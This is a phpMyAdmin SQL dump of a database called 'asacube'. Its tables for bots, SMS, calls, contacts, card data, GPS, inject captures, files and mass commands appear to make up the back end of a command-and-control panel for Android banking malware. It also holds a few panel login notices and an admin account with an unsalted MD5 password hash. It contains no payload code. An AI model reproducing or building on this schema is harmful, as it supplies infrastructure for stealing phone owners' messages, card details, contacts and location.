-- phpMyAdmin SQL Dump
-- version 4.7.9
-- https://www.phpmyadmin.net/
--
-- Servidor: 127.0.0.1:3306
-- Tiempo de generación: 09-10-2018 a las 14:42:08
-- Versión del servidor: 5.7.21
-- Versión de PHP: 5.6.35

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET AUTOCOMMIT = 0;
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Base de datos: `asacube`
--

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `apps`
--

DROP TABLE IF EXISTS `apps`;
CREATE TABLE IF NOT EXISTS `apps` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `bot_id` text NOT NULL,
  `apps` longtext NOT NULL,
  `last_update` int(11) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `apps_logs`
--

DROP TABLE IF EXISTS `apps_logs`;
CREATE TABLE IF NOT EXISTS `apps_logs` (
  `Id` int(11) NOT NULL AUTO_INCREMENT,
  `bid` text NOT NULL,
  `app` text NOT NULL,
  `scr` text NOT NULL,
  `time` int(11) NOT NULL,
  PRIMARY KEY (`Id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `bots`
--

DROP TABLE IF EXISTS `bots`;
CREATE TABLE IF NOT EXISTS `bots` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `bid` text NOT NULL,
  `os_type` text NOT NULL,
  `os_lang` text NOT NULL,
  `os_ver` text NOT NULL,
  `bot_last_seen` int(11) NOT NULL,
  `bot_ver` text NOT NULL,
  `bot_sandbox` tinyint(1) NOT NULL,
  `bot_permission` text NOT NULL,
  `bot_user_id` int(11) NOT NULL,
  `bot_ip` text NOT NULL,
  `phone_model` text NOT NULL,
  `category` int(11) NOT NULL,
  `cell` text NOT NULL,
  `phonenumber` text NOT NULL,
  `country` text NOT NULL,
  `fav` tinyint(1) NOT NULL,
  `needactivate` int(11) NOT NULL,
  `bot_type` int(11) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `bot_category`
--

DROP TABLE IF EXISTS `bot_category`;
CREATE TABLE IF NOT EXISTS `bot_category` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` text NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `calls`
--

DROP TABLE IF EXISTS `calls`;
CREATE TABLE IF NOT EXISTS `calls` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `bot_id` text NOT NULL,
  `contact_id` int(11) NOT NULL,
  `call_type` int(11) NOT NULL,
  `call_time` bigint(11) NOT NULL,
  `call_duration` int(11) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `cards`
--

DROP TABLE IF EXISTS `cards`;
CREATE TABLE IF NOT EXISTS `cards` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `bot_id` text NOT NULL,
  `data` text NOT NULL,
  `time` int(11) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `commands`
--

DROP TABLE IF EXISTS `commands`;
CREATE TABLE IF NOT EXISTS `commands` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `bid` text NOT NULL,
  `idcom` int(11) NOT NULL,
  `value` text NOT NULL,
  `date_add` int(11) NOT NULL,
  `date_exec` int(11) NOT NULL,
  `date_recv` int(11) NOT NULL,
  `result` longtext NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `contacts`
--

DROP TABLE IF EXISTS `contacts`;
CREATE TABLE IF NOT EXISTS `contacts` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `bot_id` text NOT NULL,
  `fio` text NOT NULL,
  `phone` text NOT NULL,
  `time_update` int(11) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `files`
--

DROP TABLE IF EXISTS `files`;
CREATE TABLE IF NOT EXISTS `files` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `bot_id` int(11) NOT NULL,
  `local_path` text NOT NULL,
  `server_path` text NOT NULL,
  `file_hash` text NOT NULL,
  `time_update` int(11) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `gps`
--

DROP TABLE IF EXISTS `gps`;
CREATE TABLE IF NOT EXISTS `gps` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `bot_id` int(11) NOT NULL,
  `coordinates` text NOT NULL,
  `time_point` int(11) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `injects_data`
--

DROP TABLE IF EXISTS `injects_data`;
CREATE TABLE IF NOT EXISTS `injects_data` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `bid` text NOT NULL,
  `data` text NOT NULL,
  `time` int(11) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `mass_commands`
--

DROP TABLE IF EXISTS `mass_commands`;
CREATE TABLE IF NOT EXISTS `mass_commands` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `idcom` int(11) NOT NULL,
  `value` text NOT NULL,
  `date_add` int(11) NOT NULL,
  `repeat_need` tinyint(1) NOT NULL,
  `repeat_time` int(11) NOT NULL,
  `userid` int(11) NOT NULL,
  `params` text NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `mass_commands_group`
--

DROP TABLE IF EXISTS `mass_commands_group`;
CREATE TABLE IF NOT EXISTS `mass_commands_group` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` text NOT NULL,
  `userid` int(11) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `notifications`
--

DROP TABLE IF EXISTS `notifications`;
CREATE TABLE IF NOT EXISTS `notifications` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `userid` int(11) NOT NULL,
  `text` text NOT NULL,
  `link` text NOT NULL,
  `time_create` int(11) NOT NULL,
  `time_read` int(11) NOT NULL,
  `time_jabber_send` int(11) NOT NULL,
  `type` int(11) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=13 DEFAULT CHARSET=latin1;

--
-- Volcado de datos para la tabla `notifications`
--

INSERT INTO `notifications` (`id`, `userid`, `text`, `link`, `time_create`, `time_read`, `time_jabber_send`, `type`) VALUES
(1, 1, 'You entered to panel', 'notices.php', 1532620952, 1538631285, 0, 1),
(2, 1, 'Install new admin version 0.4.5', 'notices.php', 1532620965, 1538631290, 0, 1),
(3, 1, 'You entered to panel', 'notices.php', 1532621586, 1538631306, 0, 1),
(4, 1, 'You entered to panel', 'notices.php', 1532621740, 1538631306, 0, 1),
(5, 1, 'You entered to panel', 'notices.php', 1533168027, 1538631306, 0, 1),
(6, 1, 'You entered to panel', 'notices.php', 1535211855, 1538631306, 0, 1),
(7, 1, 'You entered to panel', 'notices.php', 1535212868, 1538631306, 0, 1),
(8, 1, 'You entered to panel', 'notices.php', 1535833074, 1538631306, 0, 1),
(9, 1, 'You entered to panel', 'notices.php', 1538631191, 1538631306, 0, 1),
(10, 1, 'You entered to panel', 'notices.php', 1538631256, 1538631306, 0, 1),
(11, 1, 'Add new user admin', 'settings.php', 1538631290, 1538631306, 0, 1),
(12, 1, 'Delete user 2', 'settings.php', 1538631293, 1538631306, 0, 1);

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `reports`
--

DROP TABLE IF EXISTS `reports`;
CREATE TABLE IF NOT EXISTS `reports` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `botid` int(11) NOT NULL,
  `idcom` int(11) NOT NULL,
  `result` text NOT NULL,
  `date_recv` int(11) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `sms`
--

DROP TABLE IF EXISTS `sms`;
CREATE TABLE IF NOT EXISTS `sms` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `bot_id` text NOT NULL,
  `sms_from` int(11) NOT NULL,
  `sms_to` int(11) NOT NULL,
  `sms_text` text NOT NULL,
  `sms_time` bigint(11) NOT NULL,
  `sms_hash` text NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `users`
--

DROP TABLE IF EXISTS `users`;
CREATE TABLE IF NOT EXISTS `users` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `login` text NOT NULL,
  `password` text NOT NULL,
  `session` text NOT NULL,
  `time_last_seen` int(11) NOT NULL,
  `license` int(11) NOT NULL,
  `params` longtext,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;

--
-- Volcado de datos para la tabla `users`
--

INSERT INTO `users` (`id`, `login`, `password`, `session`, `time_last_seen`, `license`, `params`) VALUES
(1, 'admin', '21232f297a57a5a743894a0e4a801fc3', '58c2033f6357d9ffdca20076410ee97a', 25, 1, '{\"admin_ver\":\"0.4.5\",\"jabber\":\"\",\"keywords\":\"\"}');
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
